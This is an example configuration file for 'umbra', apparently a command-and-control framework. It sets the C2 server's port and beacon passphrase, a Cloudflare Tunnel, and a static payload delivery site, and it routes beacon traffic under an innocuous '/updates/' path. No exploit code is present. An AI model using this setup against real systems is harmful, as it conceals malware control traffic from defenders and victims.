# umbra - shared session config (single source of truth).
#
# Copy it once and edit freely:
#     cp scripts/umbra.env.example scripts/umbra.env
#
# scripts/umbra.env is gitignored (it holds C2_PASS). serve.sh, cf_tunnel.sh,
# build.sh and verify.sh all read this same file, so the static origin and the
# tunnel can never drift apart again - that mismatch (serve.sh on one port, the
# tunnel still pointing at another) was the root cause of the "the domain serves
# somebody else's app / connection refused" symptoms.
#
# Precedence: variables exported in the shell > this file > the script default.
# So `HTTP_PORT=9000 bash scripts/serve.sh` still overrides the file for one run.

# ----- public front end ------------------------------------------------------
DOMAIN="c2.example.com"

# ----- static origin (scripts/serve.sh) --------------------------------------
# Port that scripts/serve.py binds on 127.0.0.1. Pick a FREE port: on a Kali
# box that already runs code-server (or anything else), 8080 is usually taken -
# so the default here is 8082. cf_tunnel.sh derives ORIGIN_HTTP from THIS
# value; there is nothing else to change.
HTTP_PORT="8082"

# ----- C2 (./dist/server) ----------------------------------------------------
C2_BIND="127.0.0.1"
C2_PORT="8443"
# Shared passphrase with the beacon (pack/build.sh and the server -pass).
C2_PASS="change-me-passphrase"

# ----- Cloudflare Tunnel (scripts/cf_tunnel.sh) ------------------------------
TUNNEL_NAME="umbra"
# Path prefix routed to the C2 instead of the static delivery site.
C2_PREFIX="/updates/"
